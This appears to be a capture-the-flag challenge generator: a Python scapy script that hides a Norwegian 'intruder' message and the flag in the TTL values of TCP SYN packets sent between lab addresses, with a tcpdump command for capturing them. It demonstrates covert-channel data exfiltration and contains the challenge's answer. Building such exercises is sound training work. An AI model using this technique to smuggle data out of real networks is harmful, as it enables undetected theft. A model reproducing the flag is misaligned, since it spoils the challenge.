from scapy.all import *

text = "Hei hallo, håper du har det bra! Jeg har kommet meg inn i nettet til denne karen nå og håper jeg får sendt ut noe data slik at vi får noe verdi av dette. Meldingen jeg har snappet opp internt til nå er: "
text_list = [ord(a) for a in list(text)]

flag  = "uiactf{topp_hemmelig_info_sendt_over_TTL}"
flag_list = [ord(a) for a in list(flag)]

text2 = " . Motatt? ? Nei? Hm, hvordan får jeg noe svar her da tru. Kanskje ikke ha sourceport 0 hjelper kanskje."
text2_list = [ord(a) for a in list(text2)]


for i in text_list:
    packet_1 = IP(dst="10.10.10.1",src="10.10.10.2",ttl=i)/TCP(sport=0, dport=80, flags="S") 
    send(packet_1)

for i in flag_list:
    packet_1 = IP(dst="10.10.10.1",src="10.10.10.2",ttl=i)/TCP(sport=0, dport=80, flags="S") 
    send(packet_1)

for i in text2_list:
    packet_1 = IP(dst="10.10.10.1",src="10.10.10.2",ttl=i)/TCP(sport=0, dport=80, flags="S") 
    send(packet_1)

# sudo tcpdump -s 0 -x -ni eth0 'host 10.10.10.1' -w test.pcap